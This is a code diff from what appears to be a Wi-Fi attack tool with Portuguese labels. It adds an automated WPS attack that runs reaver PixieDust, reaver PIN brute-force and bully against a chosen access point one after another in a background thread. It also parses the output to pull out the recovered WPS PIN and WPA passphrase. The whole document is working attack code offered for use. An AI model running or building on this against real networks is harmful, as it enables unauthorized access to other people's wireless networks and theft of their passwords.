@@ -612,7 +612,8 @@ def _kill_proc(p):
                 pass
 
 # ---------------- WPS attack (reaver PixieDust + PIN) ----------------
-_wps = {"proc": None, "log": f"{WORK}/wps.log", "bssid": None, "iface": None}
+_wps = {"proc": None, "log": f"{WORK}/wps.log", "bssid": None, "iface": None,
+        "fase": None, "ch": None, "essid": None}
 
 
 def _wps_log_tail(n=40):
@@ -625,16 +626,61 @@ def _wps_log_tail(n=40):
 
 def _wps_parse():
     import re
-    txt = _wps_log_tail(200)
+    txt = _wps_log_tail(400)
     pin = psk = None
-    m = re.search(r"WPS PIN:\s*.?(\d{4,8})", txt)
+    m = re.search(r"(?:WPS PIN|Pin found|PIN)\s*[:=]\s*['\"]?(\d{4,8})", txt, re.I)
     if m:
         pin = m.group(1)
-    m = re.search(r"WPA PSK:\s*.([^']+)", txt)
+    m = re.search(r"(?:WPA PSK|PSK|Password)\s*[:=]\s*['\"]?([^\s'\"]+)", txt, re.I)
     if m:
         psk = m.group(1)
-    done = ("WPS PIN:" in txt) or ("WPA PSK:" in txt)
+    done = bool(pin or psk) or ("WPS PIN:" in txt) or ("WPA PSK:" in txt)
     return pin, psk, done
+
+
+def _wps_cmd(iface, bssid, ch, fase):
+    c = ("-c %d " % int(ch)) if ch else ""
+    if fase == "pixie":
+        return ("reaver -i %s -b %s %s-K 1 -N -vvv -d 1 -T 5 -r 3:15 -l 60 -S --pixie-force"
+                % (iface, bssid, c))
+    if fase == "pin":
+        return ("reaver -i %s -b %s %s-vvv -d 1 -T 5 -r 3:15 -l 60 -S -N"
+                % (iface, bssid, c))
+    if fase == "bully":
+        return ("bully -b %s %s-d -v 3 -S -F -B" % (bssid, c))
+    return None
+
+
+def _wps_run_fase(fase):
+    cmd = _wps_cmd(_wps["iface"], _wps["bssid"], _wps["ch"], fase)
+    if not cmd:
+        return False
+    _wps["fase"] = fase
+    with open(_wps["log"], "a", errors="replace") as f:
+        f.write("\n=== fase: %s ===\n" % fase)
+    _wps["proc"] = subprocess.Popen(cmd + " >> %s 2>&1" % _wps["log"],
+                                    shell=True, preexec_fn=os.setsid)
+    limite = {"pixie": 180, "pin": 900, "bully": 600}.get(fase, 300)
+    t0 = time.time()
+    while _wps["proc"].poll() is None:
+        if time.time() - t0 > limite:
+            _kill_proc(_wps["proc"])
+            break
+        pin, psk, done = _wps_parse()
+        if done:
+            _kill_proc(_wps["proc"])
+            return True
+        time.sleep(2)
+    pin, psk, done = _wps_parse()
+    return done
+
+
+def _wps_orquestra():
+    for fase in ("pixie", "pin", "bully"):
+        if _wps_run_fase(fase):
+            return
+    with open(_wps["log"], "a", errors="replace") as f:
+        f.write("\n[-] todas as fases falharam (AP pode ter WPS desabilitado/lock)\n")
 
 
 def wps_attack_start(bssid, channel, iface=None, essid=None):
@@ -650,23 +696,30 @@ def wps_attack_start(bssid, channel, iface=None, essid=None):
     except OSError:
         pass
     _set_monitor(iface)
-    ch = ("-c %d " % int(channel)) if channel else ""
-    cmd = "reaver -i %s -b %s %s-K 1 -N -vv -d 2 -T 5 -r 3:15 -l 60 > %s 2>&1" % (iface, bssid, ch, _wps["log"])
-    _wps["proc"] = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
     _wps["bssid"] = bssid
     _wps["iface"] = iface
-    return {"ok": True, "msg": "ataque WPS iniciado (PixieDust)", "bssid": bssid, "iface": iface}
+    _wps["ch"] = channel
+    _wps["essid"] = essid
+    _wps["fase"] = "pixie"
+    import threading
+    t = threading.Thread(target=_wps_orquestra, daemon=True)
+    t.start()
+    return {"ok": True, "msg": "ataque WPS iniciado (PixieDust -> PIN -> bully)",
+            "bssid": bssid, "iface": iface}
 
 
 def wps_attack_status():
     running = bool(_wps["proc"] and _wps["proc"].poll() is None)
     pin, psk, done = _wps_parse()
-    return {"ok": True, "rodando": running, "pin": pin, "psk": psk, "sucesso": done, "bssid": _wps["bssid"], "log": _wps_log_tail(30)}
+    return {"ok": True, "rodando": running, "pin": pin, "psk": psk,
+            "sucesso": done, "bssid": _wps["bssid"], "fase": _wps["fase"],
+            "log": _wps_log_tail(30)}
 
 
 def wps_attack_stop():
     _kill_proc(_wps["proc"])
     _wps["proc"] = None
+    _wps["fase"] = None
     iface = _wps["iface"] or DEFAULT_RADIO
     _cleanup_iface(iface)
     _set_managed(iface)
